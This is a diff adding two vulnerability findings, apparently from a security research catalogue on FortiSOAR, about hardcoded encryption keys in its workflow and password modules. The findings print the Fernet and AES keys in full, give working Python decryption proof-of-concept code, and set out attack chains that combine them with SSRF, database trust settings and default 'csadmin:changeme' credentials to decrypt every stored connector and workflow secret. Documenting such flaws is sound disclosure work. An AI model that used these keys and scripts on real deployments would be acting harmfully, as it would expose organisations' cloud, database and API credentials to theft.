@@ -2634,3 +2634,166 @@ FSR_F38_DOWNLOAD_FILE_FROM_URL_SSRF = {
         "requests library used for HTTP dispatch; IRI parameter also supported."
     ),
 }
+
+# ---------------------------------------------------------
+# FSR-F39 -- hardcoded Fernet key in encrypt_decrypt_util.so
+# ---------------------------------------------------------
+FSR_F39_HARDCODED_FERNET_KEY = {
+    "id": "FSR-F39",
+    "title": "encrypt_decrypt_util.so hardcodes Fernet key PGh7aJYw8gPK0HT9W2x7ThTOyTurZShP7HmnQGQFyKA= -- all workflow secrets decryptable",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cwe": "CWE-321",
+    "component": "cyops-workflow (sealab/workflow/encrypt_decrypt_util.so)",
+    "binary": "/opt/cyops-workflow/sealab/workflow/encrypt_decrypt_util.so",
+    "disasm_evidence": {
+        "key_in_rodata": (
+            "Binary rodata contains:\n"
+            "  __pyx_k_PGh7aJYw8gPK0HT9W2x7ThTOyTurZShP (Cython constant)\n"
+            "  __pyx_kp_b_PGh7aJYw8gPK0HT9W2x7ThTOyTurZShP (BSS: Python bytes object)"
+        ),
+        "module_init_assignment": (
+            "Module init __pyx_pymod_exec_encrypt_decrypt_util (0x30d4, 3290B):\n"
+            "  0x3a43: mov rdx, [__pyx_kp_b_PGh7aJYw8gPK0HT9W2x7ThTOyTurZShP]  ; hardcoded bytes\n"
+            "  0x3a4a: mov rsi, [__pyx_n_s_ENCRYPTION_KEY]  ; key name 'ENCRYPTION_KEY'\n"
+            "  0x3a51: mov rdi, [__pyx_d]  ; module dict\n"
+            "  0x3a58: call 0x2940  ; PyDict_SetItem(module_dict, 'ENCRYPTION_KEY', hardcoded_key)\n"
+            "-> module init unconditionally sets ENCRYPTION_KEY = b'PGh7aJYw8gPK0HT9W2x7ThTOyTurZShP7HmnQGQFyKA='"
+        ),
+        "key_not_in_settings": (
+            "Django settings.py (/opt/cyops-workflow/sealab/sealab/settings.py):\n"
+            "  zero references to ENCRYPTION_KEY\n"
+            "  no generation step in any config script or install wizard found\n"
+            "  -> hardcoded value is the live key in all FortiSOAR deployments"
+        ),
+        "cross_version": (
+            "Key identical in:\n"
+            "  cyops-workflow-7.2.0-914.el7.centos.x86_64.rpm (encrypt_decrypt_util.so)\n"
+            "  cyops-workflow-7.6.7-5714.el9.x86_64.rpm (encrypt_decrypt_util.so)\n"
+            "  Same key across ALL versions where module init was checked"
+        ),
+        "fernet_algorithm": (
+            "Cython module imports cryptography.fernet.Fernet\n"
+            "Fernet = AES-128-CBC + HMAC-SHA256 + URL-safe base64\n"
+            "32-byte key confirmed: base64.urlsafe_b64decode(key) -> 32 bytes\n"
+            "All encrypt() calls produce tokens decryptable with this key"
+        ),
+    },
+    "key": "PGh7aJYw8gPK0HT9W2x7ThTOyTurZShP7HmnQGQFyKA=",
+    "key_hex": "3c687b689630f203cad074fd5b6c7b4e14cec93bab65284fec79a7406405c8a0",
+    "decrypt_poc": (
+        "from cryptography.fernet import Fernet\n"
+        "key = b'PGh7aJYw8gPK0HT9W2x7ThTOyTurZShP7HmnQGQFyKA='\n"
+        "f = Fernet(key)\n"
+        "# token = any value from workflow encrypted_data column in PostgreSQL\n"
+        "plaintext = f.decrypt(token)"
+    ),
+    "what_is_encrypted": (
+        "encrypt_decrypt_util.encrypt/decrypt are called for:\n"
+        "  workflow step parameters marked 'sensitive'\n"
+        "  environment variable values stored encrypted in PostgreSQL\n"
+        "  dynamic variable values with 'encrypted' flag\n"
+        "  Any playbook secret injected via Jinja2 environment"
+    ),
+    "chain": [
+        "FSR-F39 + pg_hba.conf trust: read PostgreSQL cyops_db -> decrypt all workflow secrets",
+        "FSR-F39 + FSR-F38 (SSRF): hit internal Elasticsearch -> extract workflow execution logs with decryptable secrets",
+        "FSR-F39 + DB read access (any path): extract + decrypt all FortiSOAR stored secrets",
+        "FSR-F39 standalone: attacker with DB read can decrypt all encrypted workflow params",
+    ],
+    "status": (
+        "CONFIRMED. Module init 0x3a43-0x3a58: PyDict_SetItem(module_dict, 'ENCRYPTION_KEY', "
+        "b'PGh7aJYw8gPK0HT9W2x7ThTOyTurZShP7HmnQGQFyKA='). "
+        "Django settings.py has no ENCRYPTION_KEY entry. "
+        "Key is valid Fernet key (32 bytes confirmed). "
+        "Identical across 7.2.0 and 7.6.7 binaries."
+    ),
+}
+
+# ---------------------------------------------------------
+# FSR-F40 -- hardcoded AES keys in PasswordModule.so
+# ---------------------------------------------------------
+FSR_F40_HARDCODED_AES_KEYS_PASSWORD_MODULE = {
+    "id": "FSR-F40",
+    "title": "PasswordModule.so hardcodes three AES-128-CFB keys -- all connector passwords decryptable",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cwe": "CWE-321",
+    "component": "cyops-common (opt/cyops/configs/scripts/.lib/PasswordModule.so)",
+    "binary": "/opt/cyops/configs/scripts/.lib/PasswordModule.so",
+    "disasm_evidence": {
+        "keys_in_binary": (
+            "Three hardcoded keys found via strings extraction:\n"
+            "  'jp3mci29fq7f2kc7'  -- 16 chars, AES-128 key (module-level default KEY)\n"
+            "  'I3dmcn23@KlS2#!ck' -- key string constant (__pyx_kp_s)\n"
+            "  'jQp3(7@jod#j38d1'  -- 16 chars, AES-128 key (used in execute function)"
+        ),
+        "module_init": (
+            "BSS symbols confirmed in __pyx_pymod_exec_PasswordModule:\n"
+            "  __pyx_n_s_jp3mci29fq7f2kc7  ; module-level string/KEY constant\n"
+            "  __pyx_kp_s_I3dmcn23_KlS2_ck ; literal string constant (actual: I3dmcn23@KlS2#!ck)\n"
+            "  __pyx_kp_s_jQp3_7_jod_j38d1 ; literal string constant (actual: jQp3(7@jod#j38d1)"
+        ),
+        "algorithm": (
+            "encrypt (0xa5d0, 6041B) and decrypt (0xbd70, 6144B) BSS refs:\n"
+            "  __pyx_n_s_AES -- PyCrypto AES\n"
+            "  __pyx_n_s_MODE_CFB -- Cipher Feedback Mode\n"
+            "  __pyx_int_16 -- 16-byte (128-bit) key\n"
+            "  __pyx_n_s_Random + __pyx_n_s_new + __pyx_n_s_read -- IV = Random.new().read(AES.block_size)\n"
+            "  __pyx_n_s_b64encode / __pyx_n_s_b64decode -- base64 encoding of IV+ciphertext\n"
+            "  __pyx_n_s_suffix -- suffix appended post-encryption (endswith check in decrypt)"
+        ),
+        "execute_key_ref": (
+            "execute (0x8ce0, 6378B) at 0x8f52: __pyx_kp_s_jQp3_7_jod_j38d1\n"
+            "  -> CLI invocation uses jQp3(7@jod#j38d1 as AES key\n"
+            "execute dispatches to encrypt/decrypt based on argv[1]\n"
+            "  -> used by csadm password management commands"
+        ),
+        "scope": (
+            "PasswordModule.so is the connector credential manager:\n"
+            "  path /opt/cyops/configs/scripts/.lib/PasswordModule.so\n"
+            "  module path connectors.PasswordModule\n"
+            "  functions: encrypt, decrypt, get_value, change_password, execute\n"
+            "  get_value: retrieves and decrypts stored connector passwords\n"
+            "  DB_CREDS_FILE: /opt/cyops/configs/database/db.conf (target of change_password)"
+        ),
+    },
+    "keys": {
+        "KEY_DEFAULT": "jp3mci29fq7f2kc7",
+        "KEY_ALT": "I3dmcn23@KlS2#!ck",
+        "KEY_CLI": "jQp3(7@jod#j38d1",
+    },
+    "decrypt_poc": (
+        "from Crypto.Cipher import AES\n"
+        "import base64\n"
+        "KEY = b'jp3mci29fq7f2kc7'  # or jQp3(7@jod#j38d1\n"
+        "# ciphertext = base64-encoded blob from FortiSOAR connector config\n"
+        "raw = base64.b64decode(ciphertext)\n"
+        "iv = raw[:AES.block_size]  # first 16 bytes\n"
+        "cipher = AES.new(KEY, AES.MODE_CFB, iv)\n"
+        "plaintext = cipher.decrypt(raw[AES.block_size:])\n"
+        "# strip suffix if present"
+    ),
+    "what_is_encrypted": (
+        "Connector credentials stored by FortiSOAR for all integrations:\n"
+        "  API keys, OAuth tokens, service account passwords\n"
+        "  Database credentials for integrated systems\n"
+        "  SMTP/IMAP passwords for email connectors\n"
+        "  Cloud provider credentials (AWS/Azure/GCP)\n"
+        "  All stored in PostgreSQL cyops_db, encrypted with jp3mci29fq7f2kc7"
+    ),
+    "chain": [
+        "FSR-F40 + pg_hba.conf trust: psql cyops_db -> SELECT * FROM integrations_connector -> decrypt all connector creds with jp3mci29fq7f2kc7",
+        "FSR-F40 + FSR-F38 (SSRF): hit internal pg -> extract connector table -> AES decrypt with hardcoded key",
+        "FSR-F40 + FSR-F4 (csadmin:changeme): auth -> connector config API -> encrypted cred blob -> decrypt offline",
+        "FSR-F40 standalone: any FortiSOAR DB access -> decrypt all connector passwords",
+    ],
+    "status": (
+        "CONFIRMED via strings extraction and BSS analysis of PasswordModule.so. "
+        "Three hardcoded keys extracted: jp3mci29fq7f2kc7, I3dmcn23@KlS2#!ck, jQp3(7@jod#j38d1. "
+        "AES-128-CFB algorithm confirmed via BSS refs (AES, MODE_CFB, int_16, Random.new). "
+        "PasswordModule.get_value used by connector subsystem to retrieve decrypted credentials."
+    ),
+}
